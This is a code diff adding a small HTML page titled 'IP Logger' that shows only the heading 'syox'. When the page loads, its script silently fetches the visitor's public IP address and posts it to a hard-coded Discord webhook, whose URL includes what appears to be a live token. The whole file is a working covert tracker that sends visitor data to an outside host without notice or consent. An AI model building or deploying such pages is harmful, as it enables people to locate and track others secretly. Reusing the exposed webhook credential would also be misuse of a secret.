@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>syox</h1>
+    <script>
+        // URL du webhook Discord
+        const webhookUrl = 'https://discord.com/api/webhooks/1258433063931744256/EGl5Ttipe4XNONjLEJ7dHqzvI3Sru_mfFPL-D_gO7UAEZC1ZWLBtVaV3kBoZKpbB-7Pf';
+
+        // Fonction pour obtenir l'IP publique
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                // Créer un formulaire invisible pour soumettre les données
+                const form = new FormData();
+                form.append('content', `New visitor IP: ${ip}`);
+                
+                // Utiliser fetch pour envoyer l'IP au webhook Discord
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    body: form
+                }).then(response => {
+                    if (response.ok) {
+                        console.log(`IP sent to Discord: ${ip}`);
+                    } else {
+                        console.error('Failed to send IP to Discord');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                });
+            }).catch(error => {
+                console.error('Error fetching IP:', error);
+            });
+    </script>
+</body>
+</html>
